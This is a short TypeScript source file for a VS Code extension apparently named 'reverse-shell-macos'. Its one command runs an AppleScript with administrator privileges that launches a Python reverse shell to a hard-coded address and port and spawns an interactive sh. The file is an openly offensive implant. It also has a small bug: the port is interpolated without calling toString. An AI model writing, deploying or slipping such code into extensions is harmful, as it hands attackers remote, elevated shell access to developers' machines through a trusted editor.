import * as vscode from 'vscode';
import { platform } from 'node:process';
import * as cp from 'node:child_process';

const ip = "127.0.0.1";
const port = 9001;

export function activate(context: vscode.ExtensionContext) {

	let command = vscode.commands.registerCommand('reverse-shell-macos.sendReverseShell', () => {
		
		if (platform !== "darwin") { console.error("Error: Not running on MacOS"); return; }

		cp.exec(`osascript -e "do shell script \\\"python3 -c \\\\\\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',${port.toString}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('sh')\\\\\\\"\\\" with administrator privileges"`);

	});

	context.subscriptions.push(command);
}

export function deactivate() {}
